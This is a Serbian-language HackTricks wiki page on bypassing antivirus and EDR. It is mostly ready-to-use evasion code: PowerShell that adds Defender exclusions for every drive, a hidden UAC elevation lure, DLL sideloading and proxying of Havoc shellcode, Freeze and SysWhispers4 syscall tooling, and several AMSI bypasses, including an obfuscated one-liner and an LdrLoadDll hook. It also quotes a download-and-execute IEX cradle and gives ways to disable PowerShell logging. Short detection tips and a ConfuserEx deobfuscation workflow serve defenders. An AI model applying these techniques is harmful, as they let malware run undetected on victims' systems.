# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je prvobitno napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zaustavljanje Defender-a

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje rada Windows Defender-a.
- [no-defender](https://github.com/es3n1n/no-defender): Alat za zaustavljanje rada Windows Defender-a lažnim predstavljanjem drugog AV-a.
- [Onemogućite Defender ako ste admin](basic-powershell-for-pentesters/README.md)

### UAC mamac u stilu instalera pre manipulisanja Defender-om

Javni loader-i koji se lažno predstavljaju kao game cheat-ovi često se distribuiraju kao nepotpisani Node.js/Nexe installer-i koji prvo **traže od korisnika elevaciju**, a tek zatim onesposobljavaju Defender. Tok je jednostavan:

1. Proverite da li postoji administratorski kontekst pomoću `net session`. Komanda uspeva samo kada pozivalac poseduje admin privilegije, pa neuspeh ukazuje na to da loader radi kao standardni korisnik.
2. Odmah ponovo pokrenite samog sebe pomoću glagola `RunAs` da biste pokrenuli očekivani UAC zahtev za saglasnost, uz očuvanje originalne komandne linije.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Žrtve već veruju da instaliraju „crackovan“ softver, pa se upit obično prihvata, čime malware dobija prava potrebna za promenu Defender-ove politike.<sup>[[26]](#references)</sup>

### Blanket `MpPreference` exclusions za svako slovo diska

Nakon dobijanja elevated privilegija, lanci nalik GachiLoader-u maksimalno povećavaju Defender-ove slepe tačke umesto da potpuno onemoguće servis. Loader najpre gasi GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), a zatim postavlja **izuzetno široke exclusions**, tako da svaki korisnički profil, sistemski direktorijum i prenosivi disk postaju nedostupni za skeniranje:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Ključna zapažanja:

- Petlja prolazi kroz svaki montirani filesystem (D:\, E:\, USB stikove itd.), tako da se **svaki budući payload postavljen bilo gde na disku ignoriše**.
- Isključivanje ekstenzije `.sys` je usmereno na budućnost — napadači zadržavaju mogućnost da kasnije učitaju unsigned drivere bez ponovnog menjanja Defender-a.
- Sve izmene se upisuju pod `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, što kasnijim fazama omogućava da potvrde da izuzeci opstaju ili da ih prošire bez ponovnog pokretanja UAC-a.

Pošto se nijedan Defender servis ne zaustavlja, naivne provere stanja i dalje prijavljuju „antivirus aktivan“, iako real-time inspekcija uopšte ne proverava te putanje.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Trenutno AV-ovi koriste različite metode za proveru da li je fajl malicious ili ne: statičku detekciju, dynamic analysis, a kod naprednijih EDR-ova i behavioural analysis.

### **Statička detekcija**

Statička detekcija se postiže označavanjem poznatih malicious stringova ili nizova bajtova u binarnom fajlu ili skripti, kao i izvlačenjem informacija iz samog fajla (npr. opis fajla, naziv kompanije, digitalni potpisi, ikona, checksum itd.). To znači da korišćenje poznatih javno dostupnih alata može lakše dovesti do toga da budete otkriveni, jer su oni verovatno već analizirani i označeni kao malicious. Postoji nekoliko načina da se zaobiđe ova vrsta detekcije:

- **Encryption**

Ako encryptujete binarni fajl, AV neće imati način da detektuje vaš program, ali će vam biti potreban neki loader za dešifrovanje i pokretanje programa u memoriji.

- **Obfuscation**

Ponekad je dovoljno samo da promenite neke stringove u binarnom fajlu ili skripti kako bi prošli AV, ali to može biti vremenski zahtevno, u zavisnosti od toga šta pokušavate da obfuscate.

- **Custom tooling**

Ako razvijete sopstvene alate, neće postojati poznati bad signatures, ali to zahteva mnogo vremena i truda.

> [!TIP]
> Dobar način za proveru Windows Defender statičke detekcije jeste [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On u osnovi deli fajl na više segmenata, a zatim nalaže Defender-u da svaki od njih skenira pojedinačno, čime može precizno da vam pokaže koji su stringovi ili bajtovi u vašem binarnom fajlu označeni.

Toplo preporučujem da pogledate ovu [YouTube playlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom AV Evasion-u.

### **Dynamic analysis**

Dynamic analysis podrazumeva da AV pokrene vaš binarni fajl u sandbox-u i prati malicious aktivnosti (npr. pokušaj dešifrovanja i čitanja passworda iz browser-a, izvršavanje minidump-a nad LSASS-om itd.). Sa ovim delom može biti malo teže raditi, ali evo nekoliko stvari koje možete uraditi za izbegavanje sandbox-ova.

- **Sleep pre izvršavanja** U zavisnosti od načina implementacije, ovo može biti odličan način za zaobilaženje AV dynamic analysis-a. AV-ovi imaju veoma malo vremena za skeniranje fajlova kako ne bi prekidali workflow korisnika, pa dugi sleep-ovi mogu ometati analizu binarnih fajlova. Problem je u tome što mnogi AV sandbox-ovi mogu jednostavno preskočiti sleep, u zavisnosti od načina na koji je implementiran.
- **Provera resursa mašine** Sandbox-ovi obično imaju veoma malo resursa na raspolaganju (npr. < 2GB RAM-a), jer bi u suprotnom mogli usporiti mašinu korisnika. Ovde takođe možete biti veoma kreativni, na primer proverom temperature CPU-a ili čak brzine ventilatora — neće sve biti implementirano u sandbox-u.
- **Provere specifične za mašinu** Ako želite da ciljate korisnika čija je workstation priključena na domen „contoso.local“, možete proveriti domen računara i videti da li se poklapa sa onim koji ste naveli; ako se ne poklapa, možete učiniti da se program ugasi.

Ispostavlja se da je computername Microsoft Defender Sandbox-a HAL9TH, pa u svom malware-u možete proveriti ime računara pre detonacije. Ako se ime poklapa sa HAL9TH, to znači da ste unutar Defender sandbox-a, pa možete učiniti da se program ugasi.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Još neke veoma dobre savete od [@mgeeky](https://twitter.com/mariuszbit) za suprotstavljanje sandbox-ovima

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kao što smo već rekli u ovom postu, **public tools** će vremenom biti **detektovani**, pa treba da postavite sebi sledeće pitanje:

Na primer, ako želite da dumpujete LSASS, **da li zaista morate da koristite mimikatz**? Ili biste mogli da koristite neki drugi, manje poznat projekat koji takođe dumpuje LSASS.

Pravi odgovor je verovatno ovo drugo. Ako uzmemo mimikatz kao primer, on je verovatno jedan od, ako ne i najviše označenih komada malware-a od strane AV-ova i EDR-ova. Iako je sam projekat veoma dobar, rad sa njim radi zaobilaženja AV-ova predstavlja pravu noćnu moru, pa jednostavno potražite alternative za ono što pokušavate da postignete.

> [!TIP]
> Kada menjate svoje payload-e radi evasion-a, obavezno **isključite automatic sample submission** u Defender-u i, ozbiljno vas molim, **NEMOJTE UPLOADOVATI NA VIRUSTOTAL** ako vam je cilj dugoročno postizanje evasion-a. Ako želite da proverite da li određeni AV detektuje vaš payload, instalirajte ga na VM, pokušajte da isključite automatic sample submission i testirajte ga tamo dok ne budete zadovoljni rezultatom.

## EXEs vs DLLs

Kad god je moguće, uvek **dajte prednost korišćenju DLL-ova za evasion**. Prema mom iskustvu, DLL fajlovi su obično **mnogo ređe detektovani** i analizirani, pa je to veoma jednostavan trik za izbegavanje detekcije u nekim slučajevima (naravno, ako vaš payload može da se pokrene kao DLL).

Kao što možemo videti na ovoj slici, DLL Payload iz Havoc-a ima detection rate od 4/26 na antiscan.me, dok EXE payload ima detection rate od 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me poređenje normalnog Havoc EXE payload-a sa normalnim Havoc DLL-om</p></figcaption></figure>

Sada ćemo prikazati neke trikove koje možete koristiti sa DLL fajlovima kako biste bili mnogo stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** koristi DLL search order koji loader primenjuje tako što victim aplikaciju i malicious payload-ove postavlja jedne pored drugih.

Programe koji su podložni DLL Sideloading-u možete pronaći pomoću alata [Siofra](https://github.com/Cybereason/siofra) i sledeće powershell skripte:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ova komanda će prikazati listu programa podložnih DLL hijacking-u unutar direktorijuma "C:\Program Files\\" i DLL fajlove koje pokušavaju da učitaju.

Toplo preporučujem da **samostalno istražite programe podložne DLL Hijacking-u/Sideloading-u**, ova tehnika je prilično neupadljiva kada se pravilno izvede, ali ako koristite javno poznate DLL Sideloadable programe, lako možete biti otkriveni.

Samo postavljanje zlonamernog DLL-a sa imenom koje program očekuje neće učitati vaš payload, jer program očekuje određene funkcije unutar tog DLL-a. Da bismo rešili ovaj problem, koristićemo drugu tehniku pod nazivom **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program upućuje sa proxy (i zlonamernog) DLL-a na originalni DLL, čime se očuvava funkcionalnost programa i omogućava izvršavanje vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autora [@flangvik](https://twitter.com/Flangvik/)

Ovo su koraci koje sam pratio:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Poslednja komanda će nam dati 2 datoteke: šablon izvornog koda DLL-a i originalni preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Ovo su rezultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I naš shellcode (enkodovan pomoću [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu detekcije 0/26 na [antiscan.me](https://antiscan.me)! To bih nazvao uspehom.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Toplo preporučujem** da pogledate [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading-u, kao i [ippsec-ov video](https://www.youtube.com/watch?v=3eROsG_WNpE), kako biste saznali više o onome o čemu smo detaljnije razgovarali.

### Zloupotreba Forwarded Exports (ForwardSideLoading)

Windows PE moduli mogu da eksportuju funkcije koje su zapravo "forwarders": umesto pokazivača na kod, export entry sadrži ASCII string u obliku `TargetDll.TargetFunc`. Kada caller razrešava export, Windows loader će:

- Učitati `TargetDll` ako već nije učitan
- Razrešiti `TargetFunc` iz njega

Ključna ponašanja koja treba razumeti:
- Ako je `TargetDll` KnownDLL, biće obezbeđen iz zaštićenog KnownDLLs namespace-a (npr. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ako `TargetDll` nije KnownDLL, koristi se uobičajeni redosled pretrage DLL-ova, koji uključuje direktorijum modula koji obavlja forward resolution.

Ovo omogućava indirektni sideloading primitive: pronađite potpisani DLL koji eksportuje funkciju prosleđenu ka nazivu modula koji nije KnownDLL, a zatim smestite taj potpisani DLL zajedno sa DLL-om pod kontrolom napadača, nazvanim tačno kao prosleđeni ciljni modul. Kada se pozove forwarded export, loader razrešava forward i učitava vaš DLL iz istog direktorijuma, izvršavajući vaš DllMain.<sup>[[13]](#references)</sup>

Primer zabeležen na Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nije KnownDLL, tako da se rešava putem uobičajenog redosleda pretrage.

PoC (copy-paste):
1) Kopirajte potpisani sistemski DLL u folder sa dozvolom za upisivanje
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Postavite zlonamerni `NCRYPTPROV.dll` u isti folder. Minimalni DllMain je dovoljan za izvršavanje koda; ne morate implementirati prosleđenu funkciju da biste pokrenuli DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Pokrenite prosleđivanje pomoću potpisanog LOLBin-a:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Uočeno ponašanje:
- rundll32 (potpisan) učitava side-by-side `keyiso.dll` (potpisan)
- Prilikom razrešavanja `KeyIsoSetAuditingInterface`, loader prati forward do `NCRYPTPROV.SetAuditingInterface`
- Loader zatim učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementiran, grešku „missing API“ dobićete tek nakon što je `DllMain` već izvršen

Saveti za hunting:
- Fokusirajte se na forwarded exports kod kojih ciljni modul nije KnownDLL. KnownDLLs su navedeni pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Forwarded exports možete enumerisati pomoću alata kao što su:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte popis Windows 11 forwarder-a da biste pronašli kandidate: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideje za detekciju/odbranu:
- Nadgledajte LOLBins (npr. rundll32.exe) koji učitavaju potpisane DLL-ove iz nesistemskih putanja, nakon čega iz tog direktorijuma učitavaju non-KnownDLLs sa istim osnovnim imenom
- Generišite upozorenje za lance procesa/modula kao što je: `rundll32.exe` → nesistemski `keyiso.dll` → `NCRYPTPROV.dll` u putanjama u koje korisnik može da upisuje
- Primenite politike integriteta koda (WDAC/AppLocker) i onemogućite write+execute u direktorijumima aplikacija

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze je toolkit za payload-e koji služi za zaobilaženje EDR-ova pomoću suspendovanih procesa, direktnih syscalls i alternativnih metoda izvršavanja`

Freeze možete koristiti za stealthy učitavanje i izvršavanje svog shellcode-a.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je samo igra mačke i miša; ono što funkcioniše danas može biti detektovano sutra, zato se nikada ne oslanjajte na samo jedan alat, već, ako je moguće, pokušajte da ulančate više evasion tehnika.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR-ovi često postavljaju **user-mode inline hooks** na syscall stubove u `ntdll.dll`. Da biste zaobišli te hook-ove, možete generisati **direct** ili **indirect syscall** stubove koji učitavaju ispravan **SSN** (System Service Number) i prelaze u kernel mode bez izvršavanja hookovanog export entrypoint-a.<sup>[[32]](#references)</sup>

**Opcije pozivanja:**
- **Direct (embedded)**: ubacuje `syscall`/`sysenter`/`SVC #0` instrukciju u generisani stub (bez pristupanja `ntdll` export-u).
- **Indirect**: skače na postojeći `syscall` gadget unutar `ntdll`, tako da prelaz u kernel mode izgleda kao da potiče iz `ntdll` (korisno za heuristic evasion); **randomized indirect** bira gadget iz pool-a pri svakom pozivu.
- **Egg-hunt**: izbegava ugrađivanje statičke `0F 05` opcode sekvence na disku; syscall sekvenca se pronalazi u runtime-u.

**Hook-resistant strategije za SSN resolution:**
- **FreshyCalls (VA sort)**: zaključuje SSN-ove sortiranjem syscall stubova prema virtualnoj adresi umesto čitanja bajtova stub-a.
- **SyscallsFromDisk**: mapira čisti `\KnownDlls\ntdll.dll`, čita SSN-ove iz njegovog `.text`, a zatim ga unmap-uje (zaobilazi sve in-memory hook-ove).
- **RecycledGate**: kombinuje VA-sorted SSN inference sa proverom opcode-a kada je stub čist; ako je hookovan, vraća se na VA inference.
- **HW Breakpoint**: postavlja DR0 na `syscall` instrukciju i koristi VEH za hvatanje SSN-a iz `EAX` tokom runtime-a, bez parsiranja hookovanih bajtova.

Primer korišćenja SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI je kreiran da spreči "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". U početku, AV-ovi su mogli da skeniraju samo **fajlove na disku**, pa ako biste nekako mogli da izvršite payload **direktno u memoriji**, AV ne bi mogao ništa da uradi kako bi to sprečio, jer nije imao dovoljnu vidljivost.

AMSI funkcija je integrisana u sledeće Windows komponente.

- User Account Control, ili UAC (elevacija EXE, COM, MSI ili ActiveX instalacije)
- PowerShell (skripte, interaktivna upotreba i dinamička evaluacija koda)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Office VBA makroi

Ona omogućava antivirusnim rešenjima da analiziraju ponašanje skripti tako što izlaže sadržaj skripti u formi koja je istovremeno nešifrovana i neobfuskirana.

Pokretanje `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` proizvešće sledeće upozorenje u Windows Defender-u.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Obratite pažnju na to kako dodaje `amsi:`, a zatim putanju do izvršnog fajla iz kojeg je skripta pokrenuta, u ovom slučaju powershell.exe

Nismo upisali nijedan fajl na disk, ali smo ipak uhvaćeni u memoriji zbog AMSI-ja.

Štaviše, počev od **.NET 4.8**, C# kod se takođe izvršava kroz AMSI. Ovo čak utiče i na `Assembly.Load(byte[])` za učitavanje izvršavanja u memoriji. Zato se za izvršavanje u memoriji preporučuje korišćenje starijih verzija .NET-a (kao što je 4.7.2 ili starija), ako želite da zaobiđete AMSI.

Postoji nekoliko načina da se zaobiđe AMSI:

- **Obfuscation**

Pošto AMSI uglavnom funkcioniše pomoću statičkih detekcija, izmena skripti koje pokušavate da učitate može biti dobar način za izbegavanje detekcije.

Međutim, AMSI ima mogućnost da ukloni obfuskaciju iz skripti čak i ako imaju više slojeva, pa obfuscation može biti loša opcija u zavisnosti od načina na koji je urađen. Zbog toga zaobilaženje nije sasvim jednostavno. Ipak, ponekad je dovoljno samo promeniti nekoliko naziva promenljivih i problem je rešen, pa to zavisi od toga koliko je nešto označeno.

- **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u powershell (kao i cscript.exe, wscript.exe itd.) proces, moguće je lako menjati ga čak i kada se izvršava kao neprivilegovani korisnik. Zbog ovog nedostatka u implementaciji AMSI-ja, istraživači su pronašli više načina za zaobilaženje AMSI skeniranja.

**Forcing an Error**

Prisiljavanje AMSI inicijalizacije da ne uspe (amsiInitFailed) dovešće do toga da se za trenutni proces ne pokrene skeniranje. Ovo je prvobitno objavio [Matt Graeber](https://twitter.com/mattifestation), a Microsoft je razvio signature kako bi sprečio širu upotrebu.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Bila je potrebna samo jedna linija PowerShell koda da AMSI postane neupotrebljiv za trenutni PowerShell proces. Ovu liniju je, naravno, detektovao sam AMSI, pa je potrebna određena izmena kako bi se ova tehnika koristila.

Evo izmenjenog AMSI bypass koda koji sam preuzeo sa ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Imajte na umu da će ovo verovatno biti flagovano čim ova objava bude objavljena, zato ne bi trebalo da objavljujete nikakav kod ako vam je plan da ostanete neotkriveni.

**Memory Patching**

Ovu tehniku je prvobitno otkrio [@RastaMouse](https://twitter.com/_RastaMouse/), a podrazumeva pronalaženje adrese funkcije "AmsiScanBuffer" u amsi.dll (odgovorne za skeniranje inputa koji je uneo korisnik) i njeno prepisivanje instrukcijama koje vraćaju kod za E_INVALIDARG. Na ovaj način rezultat stvarnog skeniranja vraća 0, što se tumači kao čist rezultat.

> [!TIP]
> Pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

Postoje i mnoge druge tehnike koje se koriste za zaobilaženje AMSI-ja pomoću powershell-a. Pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**ovaj repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

### Blokiranje AMSI-ja sprečavanjem učitavanja amsi.dll (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon što se `amsi.dll` učita u trenutni proces. Robustan, jezički nezavisan bypass jeste postavljanje user-mode hook-a na `ntdll!LdrLoadDll`, koji vraća grešku kada je traženi modul `amsi.dll`. Kao rezultat toga, AMSI se nikada ne učitava i u tom procesu se ne vrše skeniranja.<sup>[[23]](#references)</sup>

Pregled implementacije (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Napomene
- Radi u PowerShell, WScript/CScript i prilagođenim loaderima (u svemu što bi inače učitalo AMSI).
- Kombinujte ga sa prosleđivanjem skripti putem stdin-a (`PowerShell.exe -NoProfile -NonInteractive -Command -`) da biste izbegli duge artefakte komandne linije.
- Primećeno je da se koristi u loaderima izvršenim kroz LOLBins (npr. `regsvr32` koji poziva `DllRegisterServer`).

Alat **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** takođe generiše skriptu za zaobilaženje AMSI-ja.
Alat **[https://amsibypass.com/](https://amsibypass.com/)** takođe generiše skriptu za zaobilaženje AMSI-ja koja izbegava signature pomoću nasumično generisanih korisnički definisanih funkcija, promenljivih i izraza znakova, kao i primenom nasumične veličine slova na PowerShell ključne reči radi izbegavanja signature.

**Uklonite detektovani signature**

Možete koristiti alat kao što su **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** za uklanjanje detektovanog AMSI signature iz memorije trenutnog procesa. Ovaj alat funkcioniše tako što skenira memoriju trenutnog procesa u potrazi za AMSI signature, a zatim ga prepisuje NOP instrukcijama, čime ga efektivno uklanja iz memorije.

**AV/EDR proizvodi koji koriste AMSI**

Listu AV/EDR proizvoda koji koriste AMSI možete pronaći na adresi **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Koristite Powershell verziju 2**
Ako koristite PowerShell verziju 2, AMSI neće biti učitan, pa možete izvršavati skripte bez AMSI skeniranja. To možete uraditi na sledeći način:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging je funkcija koja omogućava beleženje svih PowerShell komandi izvršenih na sistemu. Ovo može biti korisno u svrhe revizije i rešavanja problema, ali takođe može predstavljati **problem za napadače koji žele da izbegnu detekciju**.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Onemogućite PowerShell Transcription i Module Logging**: U tu svrhu možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Koristite Powershell version 2**: Ako koristite PowerShell version 2, AMSI se neće učitati, pa možete pokretati skripte bez AMSI skeniranja. To možete uraditi ovako: `powershell.exe -version 2`
- **Koristite unmanaged PowerShell session**: Koristite [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) za hostovanje PowerShell-a bez pokretanja `powershell.exe` (pristup koji koristi Cobalt Strike-ov `powerpick`). Ovo zaobilazi kontrole posebno vezane za proces `powershell.exe`, ali samo po sebi ne onemogućava AMSI, Script Block Logging niti svaku drugu PowerShell odbranu; pokrivenost zavisi od runtime-a i implementacije hosta.


## Obfuscation

> [!TIP]
> Nekoliko tehnika obfuscation-a oslanja se na enkripciju podataka, što će povećati entropiju binarnog fajla i olakšati AV-ovima i EDR-ovima njegovu detekciju. Budite oprezni sa ovim i možda primenite enkripciju samo na određene delove koda koji su osetljivi ili moraju biti skriveni.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Prilikom analize malware-a koji koristi ConfuserEx 2 (ili komercijalne fork-ove), uobičajeno je suočiti se sa nekoliko slojeva zaštite koji će blokirati decompilere i sandbox-e. Tok rada u nastavku pouzdano **vraća gotovo originalni IL** koji se zatim može decompilovati u C# pomoću alata kao što su dnSpy ili ILSpy.<sup>[[10]](#references)</sup>

1. Uklanjanje anti-tampering zaštite – ConfuserEx enkriptuje svako *method body* i dekriptuje ga unutar statičkog konstruktora (`<Module>.cctor`) *module*-a. Ovo takođe menja PE checksum, pa će svaka izmena izazvati rušenje binarnog fajla. Koristite **AntiTamperKiller** da pronađete enkriptovane metadata tabele, povratite XOR ključeve i prepišete čisti assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Izlaz sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni prilikom izrade sopstvenog unpacker-a.

2. Oporavak simbola / control-flow-a – prosledite *clean* fajl alatu **de4dot-cex** (ConfuserEx-aware fork alata de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Opcije:
• `-p crx` – bira ConfuserEx 2 profil
• de4dot će poništiti control-flow flattening, vratiti originalne namespace-ove, klase i nazive promenljivih i dekripтовati konstantne stringove.

3. Uklanjanje proxy poziva – ConfuserEx zamenjuje direktne pozive metoda laganim wrapper-ima (poznatim i kao *proxy calls*) kako bi dodatno otežao decompilation. Uklonite ih pomoću alata **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nakon ovog koraka trebalo bi da vidite normalne .NET API-je kao što su `Convert.FromBase64String` ili `AES.Create()`, umesto neprozirnih wrapper funkcija (`Class8.smethod_10`, …).

4. Ručno sređivanje – pokrenite dobijeni binarni fajl u dnSpy-ju, pretražite velike Base64 blokove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` da biste pronašli *stvarni* payload. Malware ga često čuva kao TLV-encoded niz bajtova inicijalizovan unutar `<Module>.byte_0`.

Gornji lanac obnavlja tok izvršavanja **bez potrebe za pokretanjem zlonamernog uzorka** – što je korisno pri radu na offline radnoj stanici.

> 🛈  ConfuserEx generiše custom attribute pod nazivom `ConfusedByAttribute`, koji se može koristiti kao IOC za automatsko trijažiranje uzoraka.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
